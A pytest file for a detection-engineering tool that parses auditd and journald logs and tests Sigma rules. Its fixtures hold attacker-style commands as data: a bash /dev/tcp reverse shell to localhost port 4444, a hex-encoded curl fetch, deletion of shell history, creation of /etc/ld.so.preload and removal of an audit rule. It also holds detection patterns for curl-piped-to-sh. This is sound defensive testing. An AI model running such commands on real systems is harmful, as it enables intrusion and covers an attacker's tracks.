import json
import textwrap
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]


@pytest.fixture
def audit_lines():
    """Small hand-written audit stream: exec, connect (v4), unlink, rename,
    config change. Quoted/unquoted/hex forms mixed the way auditd does."""
    return textwrap.dedent("""\
        type=SYSCALL msg=audit(1700000000.100:900): arch=c000003e syscall=59 success=yes exit=0 a0=7f0 items=2 ppid=1 pid=10 auid=1000 uid=1000 gid=1000 euid=1000 comm="bash" exe="/usr/bin/bash" key="sd"
        type=CWD msg=audit(1700000000.100:900): cwd="/tmp/sigdiff-lab/work"
        type=EXECVE msg=audit(1700000000.100:900): argc=3 a0="bash" a1="-c" a2="exec 3<>/dev/tcp/127.0.0.1/4444"
        type=PATH msg=audit(1700000000.100:900): item=0 name="/usr/bin/bash" nametype=NORMAL
        type=PATH msg=audit(1700000000.100:900): item=1 name="/lib64/ld-linux-x86-64.so.2" nametype=NORMAL
        type=PROCTITLE msg=audit(1700000000.100:900): proctitle=62617368002D6300
        type=SYSCALL msg=audit(1700000000.200:901): arch=c000003e syscall=42 success=no exit=-111 a0=3 items=0 ppid=10 pid=10 auid=1000 uid=1000 gid=1000 euid=1000 comm="bash" exe="/usr/bin/bash" key="sd"
        type=CWD msg=audit(1700000000.200:901): cwd="/tmp/sigdiff-lab/work"
        type=SOCKADDR msg=audit(1700000000.200:901): saddr=0200115C7F0000010000000000000000
        type=SYSCALL msg=audit(1700000000.300:902): arch=c000003e syscall=263 success=yes exit=0 a0=ffffff9c items=1 ppid=10 pid=11 auid=1000 uid=1000 gid=1000 euid=1000 comm="rm" exe="/usr/bin/rm" key="sd"
        type=CWD msg=audit(1700000000.300:902): cwd="/tmp/sigdiff-lab/work"
        type=PATH msg=audit(1700000000.300:902): item=0 name="/home/meowman/.bash_history" nametype=DELETE
        type=SYSCALL msg=audit(1700000000.400:903): arch=c000003e syscall=257 success=yes exit=3 items=1 ppid=12 pid=13 auid=1000 uid=1000 gid=1000 euid=1000 comm="cat" exe="/usr/bin/cat" key="sd"
        type=CWD msg=audit(1700000000.400:903): cwd="/tmp/sigdiff-lab/work"
        type=PATH msg=audit(1700000000.400:903): item=0 name="/etc/ld.so.preload" nametype=CREATE
        type=CONFIG_CHANGE msg=audit(1700000000.500:904): auid=1000 ses=1 op=remove_rule key="sd" list=4 res=1
    """).strip().splitlines()


def parse_all(lines):
    from sigdiff.events import AuditLogParser

    return list(AuditLogParser().parse_stream(lines))


def test_exec_event_joining(audit_lines):
    evs = parse_all(audit_lines)
    execs = [e for e in evs if e.fields.get("syscall") == "execve"]
    assert len(execs) == 1
    ev = execs[0]
    assert ev.fields["exe"] == "/usr/bin/bash"          # item=0, not the loader
    assert "exec 3<>/dev/tcp/127.0.0.1/4444" in ev.fields["cmdline"]
    assert ev.fields["cwd"] == "/tmp/sigdiff-lab/work"
    assert ev.fields["auid"] == "1000"


def test_connect_v4_saddr_decoded(audit_lines):
    conns = [e for e in parse_all(audit_lines) if e.fields.get("syscall") == "connect"]
    assert len(conns) == 1
    assert conns[0].fields["dest_ip"] == "127.0.0.1"
    assert conns[0].fields["dest_port"] == "4444"


def test_connect_v6_saddr_decoded():
    from sigdiff.events import parse_saddr

    h = "0a00" + "1f90" + "00000000" + "0011223344556677" * 2
    ip, port = parse_saddr(h)
    assert port == "8080"
    assert ip.startswith("0011:2233:4455:6677")
    # AF_UNIX: no ip at all
    assert parse_saddr("01002f72756e2f736f636b65740000") == ("", "")


def test_unlink_and_open_path_events(audit_lines):
    evs = parse_all(audit_lines)
    paths = {e.fields.get("path") for e in evs if "path" in e.fields}
    assert "/home/meowman/.bash_history" in paths
    assert "/etc/ld.so.preload" in paths


def test_config_change_event(audit_lines):
    cfg = [e for e in parse_all(audit_lines) if e.fields.get("syscall") == "audit_config"]
    assert len(cfg) == 1
    assert cfg[0].fields["op"] == "remove_rule"
    assert cfg[0].fields["auid"] == "1000"


def test_execve_hex_args():
    lines = [
        'type=SYSCALL msg=audit(1700000001.100:950): arch=c000003e syscall=59 success=yes exit=0 auid=1000 comm="sh" exe="/usr/bin/sh"',
        'type=EXECVE msg=audit(1700000001.100:950): a0="sh" a1="-c" a2=6375726c202d7320687474703a2f2f3132372e302e302e31',
    ]
    evs = parse_all(lines)
    assert len(evs) == 1
    assert "curl -s http://127.0.0.1" in evs[0].fields["cmdline"]


def test_interleaved_records_group_by_sid():
    lines = [
        'type=SYSCALL msg=audit(1700000002.100:960): syscall=59 auid=1000 comm="a" exe="/usr/bin/a"',
        'type=SYSCALL msg=audit(1700000002.101:961): syscall=59 auid=1000 comm="b" exe="/usr/bin/b"',
        'type=EXECVE msg=audit(1700000002.100:960): a0="a"',
        'type=EXECVE msg=audit(1700000002.101:961): a0="b"',
    ]
    evs = parse_all(lines)
    assert sorted(e.fields["cmdline"] for e in evs) == ["a", "b"]


JOURNAL_LINES = [
    json.dumps({"__REALTIME_TIMESTAMP": "1700000003000000", "SYSLOG_IDENTIFIER": "sshd",
                "MESSAGE": "Accepted password for sigdiff-user from 203.0.113.10 port 40022 ssh2"}),
    json.dumps({"__REALTIME_TIMESTAMP": "1700000003100000", "SYSLOG_IDENTIFIER": "sshd",
                "MESSAGE": "Failed password for invalid user admin from 203.0.113.11 port 41001 ssh2"}),
    json.dumps({"__REALTIME_TIMESTAMP": "1700000003200000", "SYSLOG_IDENTIFIER": "sshd",
                "MESSAGE": "pam_unix(sshd:session): session opened for user sigdiff-user(uid=1000) by (uid=0)"}),
    json.dumps({"__REALTIME_TIMESTAMP": "1700000003300000", "SYSLOG_IDENTIFIER": "sudo",
                "MESSAGE": "meowman : TTY=unknown ; PWD=/tmp/sigdiff-lab/work ; USER=root ; COMMAND=bash -c /tmp/sigdiff-lab/x.sh"}),
    json.dumps({"__REALTIME_TIMESTAMP": "1700000003400000", "SYSLOG_IDENTIFIER": "sudo",
                "MESSAGE": "sigdiff-lab: 3 incorrect password attempts for meowman on tty pts/0 (uid=1000)"}),
    json.dumps({"__REALTIME_TIMESTAMP": "1700000003500000", "SYSLOG_IDENTIFIER": "systemd",
                "MESSAGE": "systemd[1]: Started sigdiff-lab-probe.service - sigdiff lab probe."}),
]


def test_journald_and_auth_derivation():
    from sigdiff.events import journald_events

    evs = list(journald_events(JOURNAL_LINES))
    auth = [e for e in evs if e.source == "auth"]
    assert len(auth) == 5
    by = {(e.fields["service"], e.fields["action"]) for e in auth}
    assert ("sshd", "accepted") in by
    assert ("sshd", "failed") in by
    assert ("sshd", "session_opened") in by
    assert ("sudo", "command") in by
    assert ("sudo", "auth_fail") in by
    acc = next(e for e in auth if e.fields["action"] == "accepted")
    assert acc.fields["method"] == "password"
    assert acc.fields["src_ip"] == "203.0.113.10"
    sudo_cmd = next(e for e in auth if e.fields["action"] == "command")
    assert sudo_cmd.fields["target_user"] == "root"
    assert sudo_cmd.fields["user"] == "meowman"
    assert "/tmp/sigdiff-lab" in sudo_cmd.fields["command"]


def test_compiled_corpus_all_ok():
    from sigdiff.sigma import load_rules

    rules = load_rules(REPO / "rules")
    bad = [r for r in rules if not r.ok]
    assert not bad, [f"{r.path}: {r.error}" for r in bad]
    assert len(rules) >= 50


def test_corpus_expectations_cover_all_rules():
    from sigdiff.runner import load_techniques

    techs = load_techniques(REPO / "techniques" / "techniques.yml")
    assert len(techs) >= 25
    stems = {p.stem for p in (REPO / "rules").glob("*.yml")}
    expected = set().union(*(set(t.expect_hits) for t in techs))
    assert stems == expected  # every rule is expected somewhere; every expectation has a rule


def test_sigma_contains_or_and_not():
    from sigdiff.events import Event
    from sigdiff.sigma import compile_detection

    det = {
        "sel_a": {"CommandLine|contains": ["curl", "wget"]},
        "sel_pipe": {"CommandLine|contains": "| sh"},
        "not_local": {"CommandLine|contains": "file://"},
        "condition": "sel_a and sel_pipe and not not_local",
    }
    m = compile_detection("auditd", det)
    hit = Event("auditd", 0, {"cmdline": "curl x | sh"})
    miss1 = Event("auditd", 0, {"cmdline": "curl x"})
    miss2 = Event("auditd", 0, {"cmdline": "curl file://x | sh"})
    assert m(hit) and not m(miss1) and not m(miss2)


def test_sigma_glob_and_startswith():
    from sigdiff.events import Event
    from sigdiff.sigma import compile_detection

    m = compile_detection("auditd", {"s": {"Image|endswith": "/nmap"}, "condition": "s"})
    assert m(Event("auditd", 0, {"exe": "/usr/bin/nmap"}))
    assert not m(Event("auditd", 0, {"exe": "/usr/bin/ncat"}))
    m2 = compile_detection("auditd", {"s": {"Path|startswith": "/etc/cron.d/"}, "condition": "s"})
    assert m2(Event("auditd", 0, {"path": "/etc/cron.d/x"}))


def test_sigma_unknown_field_is_compile_error():
    from sigdiff.sigma import RuleError, compile_detection

    with pytest.raises(RuleError):
        compile_detection("auditd", {"s": {"NoSuchField": "x"}, "condition": "s"})


def test_sigma_bad_condition_is_compile_error():
    from sigdiff.sigma import RuleError, compile_detection

    with pytest.raises(RuleError):
        compile_detection("auditd", {"s": {"CommandLine|contains": "x"}, "condition": "sel_a and sel_b"})


def test_logsource_unmappable():
    from sigdiff.mapping import canonical_source

    assert canonical_source("process_creation", "", "windows") is None
    assert canonical_source("process_creation", "", "linux") == "auditd"
    assert canonical_source("", "sshd", "linux") == "auth"
    assert canonical_source("any", "", "linux") == "journald"


def test_keep_event_boundary():
    from sigdiff.capture import keep_event
    from sigdiff.events import Event

    assert keep_event(Event("auditd", 0, {"cwd": "/tmp/sigdiff-lab/work", "syscall": "execve"}, "x"))
    assert not keep_event(Event("auditd", 0, {"cwd": "/home/meowman", "syscall": "execve"}, "firefox"))
    assert not keep_event(Event("auditd", 0, {"cwd": "/", "syscall": "execve"}, "systemd"))
    assert keep_event(Event("auditd", 0, {"syscall": "audit_config", "auid": "1000", "op": "remove_rule"}))
    assert not keep_event(Event("auditd", 0, {"syscall": "audit_config", "auid": "42", "op": "remove_rule"}))
    assert keep_event(Event("journald", 0, {"message": "Started sigdiff-lab-probe.service"}))
    assert not keep_event(Event("journald", 0, {"message": "NetworkManager[1]: dhcpcd lease"}))
    assert keep_event(Event("auth", 0, {"src_ip": "203.0.113.11", "action": "failed"}))
    assert not keep_event(Event("auth", 0, {"src_ip": "8.8.8.8", "action": "failed"}, "Failed password for x from 8.8.8.8"))


def test_match_rules_counts_and_stems():
    from sigdiff.events import Event
    from sigdiff.runner import match_rules
    from sigdiff.sigma import load_rules

    rules = load_rules(REPO / "rules")
    events = [
        Event("auditd", 1, {"syscall": "execve", "exe": "/usr/bin/nmap", "cmdline": "nmap -p1 host"}),
        Event("auditd", 2, {"syscall": "connect", "dest_ip": "127.0.0.1", "dest_port": "4444"}),
        Event("auditd", 3, {"syscall": "connect", "dest_ip": "10.0.0.1", "dest_port": "4444"}),
    ]
    hits = match_rules(rules, events)
    assert hits["recon-nmap-scan"] == 1
    assert hits["suspicious-outbound-4444"] == 2


def test_events_hash_set_semantics_collapse_duplicates():
    from sigdiff.events import Event
    from sigdiff.runner import events_hash

    a = [Event("auditd", 1, {"syscall": "connect", "dest_port": "4444"}),
         Event("auditd", 2, {"syscall": "connect", "dest_port": "4444"}),
         Event("auditd", 9, {"syscall": "execve", "exe": "/usr/bin/id", "cmdline": "id"})]
    b = [Event("auditd", 5, {"syscall": "connect", "dest_port": "4444"}),
         Event("auditd", 7, {"syscall": "connect", "dest_port": "4444"}),
         Event("auditd", 8, {"syscall": "connect", "dest_port": "4444"}),
         Event("auditd", 1, {"syscall": "execve", "exe": "/usr/bin/id", "cmdline": "id"})]
    assert events_hash(a) == events_hash(b)  # 2 vs 3 identical connects: benign drift
    c = a + [Event("auditd", 3, {"syscall": "execve", "exe": "/usr/bin/new", "cmdline": "new"})]
    assert events_hash(a) != events_hash(c)  # a NEW distinct event is a real change


def test_regressions_lost_gained_drift_missing():
    from sigdiff.runner import regressions

    base = {"techniques": {
        "t1": {"hits": ["a", "b", "c"], "events_hash": "h1"},
        "t2": {"hits": ["a"], "events_hash": "h2"},
        "t3": {"hits": ["z"], "events_hash": "h3"},
        "gone": {"hits": [], "events_hash": "h4"},
    }}
    fresh = {"techniques": {
        "t1": {"hits": ["a", "b"], "events_hash": "hX"},     # lost c
        "t2": {"hits": ["a"], "events_hash": "h2"},          # identical: no signal
        "t3": {"hits": ["z"], "events_hash": "hZ"},          # same hits, drift only
        "gone2": {"hits": [], "events_hash": "h4"},
    }}
    r = regressions(base, fresh)
    assert r["lost"] == {"t1": ["c"]}
    assert r["gained"] == {}
    assert r["telemetry_drift"] == ["t3"]
    assert r["missing_tech"] == ["gone"]


def test_regressions_gained_reported():
    from sigdiff.runner import regressions

    base = {"techniques": {"t1": {"hits": ["a"], "events_hash": "h"}}}
    fresh = {"techniques": {"t1": {"hits": ["a", "loose-any-bash"], "events_hash": "h"}}}
    r = regressions(base, fresh)
    assert r["gained"] == {"t1": ["loose-any-bash"]}
    assert not r["lost"]


def test_sudo_wrap_quotes():
    from sigdiff.runner import sudo_wrap

    w = sudo_wrap("echo it's > /tmp/sigdiff-lab/x")
    assert w.startswith("sudo -S bash -c ")
    assert w.endswith("x'")


def test_replay_ok_against_builtin_fixture():
    from sigdiff.replay import load_fixtures, replay
    from sigdiff.runner import load_techniques
    from sigdiff.sigma import load_rules

    fixtures = load_fixtures(REPO / "tests" / "fixture_windows")
    rules = load_rules(REPO / "rules")
    techs = load_techniques(REPO / "techniques" / "mini.yml")
    res = replay(fixtures, rules, techs)
    assert res["ok"], res
    fired = [r["rule"] for r in res["rules"] if r["status"] == "FIRED"]
    assert "revshell-bash-devtcp" in fired
    assert "ssh-accepted-external" in fired


def test_ablate_matrix_and_diff():
    from sigdiff.ablate import ablate
    from sigdiff.replay import load_fixtures
    from sigdiff.sigma import load_rules

    fixtures = load_fixtures(REPO / "tests" / "fixture_windows")
    a = load_rules(REPO / "rules")
    b = load_rules(REPO / "rules-b")
    res = ablate(fixtures, a, b)
    assert res["rules_b_loses"], "B must lose the removed targeted rules"
    assert set(res["rules_b_loses"]) == {"suspicious-outbound-1337", "ssh-session-opened",
                                         "history-env-modified"}
    for row in res["matrix"].values():
        assert set(row["a"]) & set(row["only_b"]) == set()
        assert set(row["only_a"]) <= set(row["a"])


def test_cli_compile_command(tmp_path, capsys):
    from sigdiff.cli import main

    rc = main(["compile", "--rules", str(REPO / "rules"), "--rules", str(REPO / "rules-b")])
    out = capsys.readouterr().out
    assert rc == 0
    assert "0 with errors" in out
